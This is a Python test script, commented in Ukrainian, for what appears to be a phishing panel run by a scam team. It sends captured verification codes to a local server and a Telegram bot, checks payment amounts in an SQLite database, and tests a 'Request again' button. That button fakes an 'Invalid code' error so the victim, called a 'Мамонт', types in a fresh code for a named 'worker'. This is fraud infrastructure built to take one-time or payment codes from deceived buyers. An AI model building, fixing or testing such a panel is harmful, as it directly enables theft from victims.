#!/usr/bin/env python3
"""
Тестовий скрипт для перевірки всіх виправлень:
1. Передача page_code та username
2. Кнопка Request again
3. Правильна сума (Total замість 45)
"""

import requests
import json
import time

def test_page_code_and_username():
    """Тестує передачу page_code та username"""
    print("🧪 Тестування передачі page_code та username...")
    
    try:
        data = {
            'page_code': '1-96',  # Ваш page_code
            'ip': '127.0.0.1',
            'code': '1212'
        }
        response = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ Повідомлення надіслано успішно")
            print("   📱 Перевірте Telegram:")
            print("   🔍 Має бути:")
            print("      🧑‍🏭 Вбивер: @hexwizards")
            print("      💰 Сума: 90 EUR (замість 45)")
            print("      #️⃣ Ссылка: ?page=1-96")
            print("      🔐 Код: 1212")
        else:
            print("   ❌ Помилка надсилання повідомлення")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

def test_request_again_button():
    """Тестує кнопку Request again"""
    print("\n🧪 Тестування кнопки Request again...")
    
    try:
        # Спочатку надсилаємо код
        data = {
            'page_code': '1-96',
            'ip': '127.0.0.2',
            'code': 'TEST123'
        }
        response = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=5)
        print(f"   Код надіслано: {response.status_code}")
        
        if response.status_code == 200:
            print("   ✅ Код надіслано, кнопка Request again має з'явитися")
            print("   📱 Натисніть кнопку Request again в Telegram")
            print("   🔍 Очікуваний результат:")
            print("      - Поле коду очиститься")
            print("      - З'явиться повідомлення 'Invalid code'")
            print("      - Код запитується знову")
        else:
            print("   ❌ Помилка надсилання коду")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

def test_total_price():
    """Тестує правильну передачу суми (Total)"""
    print("\n🧪 Тестування передачі правильної суми...")
    
    try:
        # Тестуємо через /send_code endpoint
        data = {
            'page': '1-96',  # Фронтенд передає 'page'
            'ip': '127.0.0.3',
            'code': 'TOTAL90'
        }
        response = requests.post('http://127.0.0.1:8080/send_code', json=data, timeout=5)
        print(f"   Відповідь /send_code: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ Код надіслано через /send_code")
            print("   📱 Перевірте Telegram:")
            print("   🔍 Має бути:")
            print("      💰 Сума: 90 EUR (Total, замість 45)")
            print("      #️⃣ Ссылка: ?page=1-96")
            print("      🔐 Код: TOTAL90")
        else:
            print("   ❌ Помилка надсилання коду")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

def test_database_connection():
    """Тестує підключення до бази даних та правильні суми"""
    print("\n🧪 Тестування бази даних та сум...")
    
    try:
        import sqlite3
        
        # Підключаємося до бази даних
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        
        # Перевіряємо таблицю event_links для page_code 1-96
        print("\n📊 Таблиця event_links для page_code 1-96:")
        cursor.execute("SELECT event_code, user_id, price, currency FROM event_links WHERE event_code='1-96'")
        rows = cursor.fetchall()
        for row in rows:
            print(f"   event_code: {row[0]}, user_id: {row[1]}, price: {row[2]}, currency: {row[3]}")
        
        # Перевіряємо таблицю site_users для page_code 1-96
        print("\n📊 Таблиця site_users для page_code 1-96:")
        cursor.execute("SELECT page_code, price, currency FROM site_users WHERE page_code='1-96'")
        rows = cursor.fetchall()
        for row in rows:
            print(f"   page_code: {row[0]}, price: {row[1]}, currency: {row[2]}")
        
        conn.close()
        print("   ✅ Підключення до бази даних успішне")
        
    except Exception as e:
        print(f"   ❌ Помилка підключення до бази даних: {e}")

if __name__ == "__main__":
    print("🚀 Запуск тестування всіх виправлень...")
    print("⚠️  Переконайтеся, що сервер запущений на порту 8080 та бот на порту 8081!")
    print("=" * 70)
    
    test_database_connection()
    test_page_code_and_username()
    test_request_again_button()
    test_total_price()
    
    print("\n" + "=" * 70)
    print("✅ Тестування завершено!")
    print("\n📋 Що перевірити:")
    print("1. ✅ Чи правильно передається page_code")
    print("2. ✅ Чи правильно знаходиться username власника (@hexwizards)")
    print("3. ✅ Чи правильно відображається посилання (?page=1-96)")
    print("4. ✅ Чи правильно відображається код користувача (1212)")
    print("5. ✅ Чи правильно передається сума (90 EUR замість 45)")
    print("6. ✅ Чи працює кнопка Request again (очищає поле, запитує код)")
    print("7. ✅ Чи правильно працює конвертація 'page' -> 'page_code'")
    
    print("\n🔧 Очікуваний результат:")
    print("🔔 Отправлен запрос на код")
    print("🧑‍🏭 Вбивер: @hexwizards")
    print("🐘 Мамонт: User_1")
    print("💰 Сума: 90 EUR (Total, замість 45)")
    print("#️⃣ Ссылка: ?page=1-96")
    print("🔐 Код: 1212")
    
    print("\n🎯 Кнопка Request again має:")
    print("   - Очистити поле введення коду")
    print("   - Показати 'Invalid code'")
    print("   - Запитати код знову")
